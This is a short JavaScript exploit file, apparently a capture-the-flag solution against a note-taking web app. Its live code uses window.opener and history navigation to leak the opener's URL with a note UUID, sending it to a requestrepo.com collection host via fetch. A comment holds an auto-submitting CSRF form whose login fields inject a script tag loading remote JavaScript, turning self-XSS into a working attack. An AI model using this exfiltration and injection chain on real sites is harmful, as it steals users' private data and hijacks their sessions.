function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

if (window.location.hash == '#child') {
  // The child acts as the "puppet master"
  // The parent should now be on the previous page (with the note UUID in the URL param)
  console.log('sleeping');
  fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
  sleep(1000).then(() => {
    fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
  });
} else if (window.location.hash == "") {
  // Open child window
  window.open('/#child');

  // Go back to previous note page
  sleep(300).then(() => {
    window.history.back();
  });
};

/*
<!DOCTYPE html>
<html>
  <body>
    <form action="http://web:3000/login" method="POST" id="csrf">
      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@5af60e86f45bb4ae34a0c140518a6dfe0e9b94a6/uh.js'></script>">
      <input type="hidden" name="password" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@5af60e86f45bb4ae34a0c140518a6dfe0e9b94a6/uh.js'></script>">
    </form>
    <script>
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>

# this is the CSRF
Look at the payload to see how I get self-xss
*/
